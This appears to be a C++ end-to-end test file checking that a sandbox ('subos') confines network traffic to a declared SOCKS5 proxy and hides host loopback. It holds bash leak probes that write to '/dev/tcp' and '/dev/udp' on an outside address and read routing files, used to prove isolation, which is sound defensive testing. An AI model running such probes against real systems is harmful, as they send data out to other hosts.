#include <gtest/gtest.h>
import xlings.testkit;
#include "xlings/xtest.hpp"
import std;
import xlings.libs.json;
import xlings.platform;

namespace tk = xlings::testkit;
namespace fs = std::filesystem;
namespace platform = xlings::platform;

namespace {

bool read_exact(platform::TcpStream& connection, std::span<char> output) {
    while (!output.empty()) {
        const auto read = connection.receive(output, std::chrono::seconds(3));
        if (!read || *read == 0) return false;
        output = output.subspan(*read);
    }
    return true;
}

struct ProxyFixture {
    platform::LoopbackListener listener;
    std::jthread worker;
    std::mutex mutex;
    std::vector<std::string> domains;
    std::atomic<unsigned> connections { 0 };
    std::string error;
    ProxyFixture() {
        auto opened = platform::LoopbackListener::open();
        if (!opened) throw std::runtime_error(opened.error());
        listener = std::move(*opened);
        worker = std::jthread([this](std::stop_token stop) {
            while (!stop.stop_requested()) {
                auto accepted = listener.accept(std::chrono::milliseconds(50));
                if (!accepted) { error = accepted.error(); return; }
                if (!accepted->has_value()) continue;
                ++connections;
                auto& stream = **accepted;
                std::array<char, 3> greeting{};
                if (!read_exact(stream, greeting) || greeting != std::array<char, 3>{5, 1, 0}) {
                    error = "invalid SOCKS greeting"; return;
                }
                if (!stream.send_all(std::string{5, 0}, std::chrono::seconds(2))) { error = "send method"; return; }
                std::array<char, 5> header{};
                if (!read_exact(stream, header) || header[0] != 5 || header[1] != 1 || header[3] != 3) {
                    error = "target domain was not passed to SOCKS"; return;
                }
                std::string name(static_cast<unsigned char>(header[4]), '\0');
                std::array<char, 2> port{};
                if (!read_exact(stream, name) || !read_exact(stream, port)) { error = "incomplete target"; return; }
                {
                    std::lock_guard guard{mutex};
                    domains.push_back(name);
                }
                const std::string reply{5, 0, 0, 1, 0, 0, 0, 0, 0, 0};
                if (!stream.send_all(reply, std::chrono::seconds(2))) { error = "send SOCKS reply"; return; }
                std::string request;
                std::array<char, 1024> bytes{};
                while (request.find("\r\n\r\n") == std::string::npos && request.size() < 8192) {
                    const auto read = stream.receive(bytes, std::chrono::seconds(3));
                    if (!read || *read == 0) { error = "incomplete HTTP request"; return; }
                    request.append(bytes.data(), *read);
                }
                const std::string body { "through-declared-proxy" };
                if (!stream.send_all(std::format("HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.size(), body), std::chrono::seconds(2))) { error = "send HTTP fixture"; return; }
            }
        });
    }
    ~ProxyFixture() { finish(); }
    std::string url() const { return "socks5h://127.0.0.1:" + std::to_string(listener.port()); }
    void finish() { worker.request_stop(); if (worker.joinable()) worker.join(); }
};

struct Box {
    tk::Home home = tk::Home::isolated("proxy-network");
    Box() {
        home.seed_sandbox_backend();
        const auto created = home.xlings({"subos", "new", "box"});
        if (created.exit_code != 0) ADD_FAILURE() << created.transcript();
    }
    std::vector<nlohmann::json> events() const {
        return home.xlings({"subos", "log", "box", "--json", "-n", "1000"}).json_lines();
    }
};

}  // namespace

XTEST(SubosNetworkE2E, ProxyHasOneExitAndPassesTheUnresolvableDomainToThatExit,
      .area = "subos", .cost = tk::Cost::Medium, .covers = {"ISO-NET-PROXY", "OBS-NET", "OBS-EXEC"},
      .requires_ = {"linux", "xlings-bin", "sandbox"}, .resources = {"sandbox"}, .proves = "isolation") {
    if (!fs::is_regular_file("/usr/bin/curl")) GTEST_SKIP() << "curl HTTP probe unavailable";
    ProxyFixture proxy;
    Box box;
    const auto configured = box.home.xlings({"subos", "config", "box", "--sandbox", "dev", "--proxy", proxy.url(),
                                            "--observe", "full"});
    ASSERT_EQ(configured.exit_code, 0) << configured.transcript();
    const auto proxied = box.home.xlings({"subos", "exec", "box", "--", "/usr/bin/curl", "--max-time", "10",
        "--silent", "--show-error", "http://must-not-resolve-on-host.invalid/payload"});
    ASSERT_EQ(proxied.exit_code, 0) << proxied.transcript();
    EXPECT_EQ(proxied.out, "through-declared-proxy");
    {
        std::lock_guard guard{proxy.mutex};
        ASSERT_EQ(proxy.domains.size(), 1);
        EXPECT_EQ(proxy.domains.front(), "must-not-resolve-on-host.invalid");
    }
    auto host = platform::LoopbackListener::open();
    ASSERT_TRUE(host) << host.error();
    // Clearing ALL_PROXY/NO_PROXY changes client behavior, not the namespace.
    const auto refused = box.home.xlings({"subos", "exec", "box", "--", "/usr/bin/curl", "--noproxy", "*",
        "--connect-timeout", "1", "--max-time", "2", "--silent", "--show-error",
        "http://127.0.0.1:" + std::to_string(host->port()) + "/host-secret"});
    EXPECT_NE(refused.exit_code, 0) << refused.transcript();
    const auto incoming = host->accept(std::chrono::milliseconds(20));
    ASSERT_TRUE(incoming);
    EXPECT_FALSE(incoming->has_value()) << "namespace must hide the host's loopback service";
    const auto bypass = box.home.xlings({"subos", "exec", "box", "--", "/bin/bash", "-c",
        "if echo leak >/dev/tcp/198.51.100.7/80; then exit 10; fi; "
        "if echo dns-leak >/dev/udp/198.51.100.7/53; then exit 11; fi; "
        "echo interfaces; tail -n +3 /proc/net/dev; echo routes; cat /proc/net/route"});
    ASSERT_EQ(bypass.exit_code, 0) << bypass.transcript();
    EXPECT_NE(bypass.out.find("lo:"), std::string::npos);
    EXPECT_EQ(bypass.out.find("eth"), std::string::npos);
    EXPECT_EQ(bypass.out.find("tap"), std::string::npos);
    bool attempted { false }, accepted { false }, executed { false }, notified { false };
    for (const auto& event : box.events()) {
        if (event.value("kind", "") == "exec" && event.value("path", "").find("curl") != std::string::npos)
            executed = true;
        if (event.value("kind", "") == "net" && event.value("event", "") == "net-attempt") {
            notified = true;
            EXPECT_EQ(event.value("mode", ""), "proxy");
        }
        if (event.value("event", "") == "connect-attempt") {
            attempted = true;
            EXPECT_EQ(event["target"], "must-not-resolve-on-host.invalid");
            EXPECT_EQ(event["remote_dns"], true);
        }
        if (event.value("event", "") == "proxy-result") accepted = event.value("reason", "") == "accepted";
    }
    EXPECT_TRUE(attempted);
    EXPECT_TRUE(accepted);
    EXPECT_TRUE(executed) << "full observation must acknowledge curl's exec syscall";
    EXPECT_TRUE(notified) << "the same listener must report proxy namespace network syscalls";
    proxy.finish();
    EXPECT_TRUE(proxy.error.empty()) << proxy.error;
    EXPECT_EQ(proxy.connections.load(), 1) << "direct probes cannot reach the proxy by bypassing the gate";
}

XTEST(SubosNetworkE2E, NatAuditsConnectAndDnsPortRequestsBeforeContinuing,
      .area = "subos", .cost = tk::Cost::Medium, .covers = {"OBS-NET", "ISO-NET-NAT", "OBS-EXEC"},
      .requires_ = {"linux", "xlings-bin", "sandbox", "pasta"}, .resources = {"sandbox"}, .proves = "isolation") {
    Box box;
    const auto run = box.home.xlings({"subos", "exec", "box", "--sandbox=private", "--observe", "full",
        "--", "/bin/bash", "-c", "echo dns >/dev/udp/127.0.0.1/53 || true"});
    ASSERT_EQ(run.exit_code, 0) << run.transcript();
    bool request { false }, executed { false };
    for (const auto& event : box.events()) {
        if (event.value("kind", "") == "exec" && event.value("path", "").find("bash") != std::string::npos)
            executed = true;
        if (event.value("kind", "") != "net" || event.value("event", "") != "net-attempt" ||
            event.value("address", "") != "127.0.0.1") continue;
        request = true;
        EXPECT_EQ(event["mode"], "nat");
        EXPECT_EQ(event["port"], 53);
        EXPECT_EQ(event["result"], "unknown") << "notification CONTINUE proves only a request";
    }
    EXPECT_TRUE(request);
    EXPECT_TRUE(executed) << "full observation must acknowledge bash's exec syscall";
}
